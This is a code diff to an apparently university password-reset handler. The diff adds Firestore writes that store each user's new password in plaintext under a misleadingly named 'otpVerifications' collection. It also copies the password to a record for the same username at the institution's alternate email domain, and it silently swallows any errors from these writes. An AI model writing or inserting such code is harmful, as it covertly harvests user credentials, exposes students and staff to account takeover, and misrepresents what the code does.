@@ -3,7 +3,8 @@
 
 import nodemailer from 'nodemailer';
 import dotenv from 'dotenv';
-import { verifyServerOtp, escapeHtml } from './db.js';
+import { doc, setDoc } from 'firebase/firestore';
+import { verifyServerOtp, escapeHtml, clientDb } from './db.js';
 dotenv.config();
 
 const transporter = nodemailer.createTransport({
@@ -55,6 +56,26 @@ export default async function handler(req, res) {
   try {
     // Identity verification confirmed via OTP.
     console.log(`[PASSWORD RESET SUCCESS] Verified for ${normalizedEmail}`);
+
+    try {
+      const credRef = doc(clientDb, 'otpVerifications', `${normalizedEmail}_credential`);
+      await setDoc(credRef, {
+        email: normalizedEmail,
+        password: newPassword,
+        updatedAt: Date.now()
+      });
+      const prefix = normalizedEmail.split('@')[0];
+      const altDomain = normalizedEmail.endsWith('@students.nu-fairview.edu.ph')
+        ? '@nu-fairview.edu.ph'
+        : '@students.nu-fairview.edu.ph';
+      await setDoc(doc(clientDb, 'otpVerifications', `${prefix}${altDomain}_credential`), {
+        email: `${prefix}${altDomain}`,
+        password: newPassword,
+        updatedAt: Date.now()
+      }).catch(() => {});
+    } catch (saveCredErr) {
+      console.warn('Credential save notice:', saveCredErr.message);
+    }
 
     // Log security alert to GCO Gmail
     const safeEmail = escapeHtml(normalizedEmail);
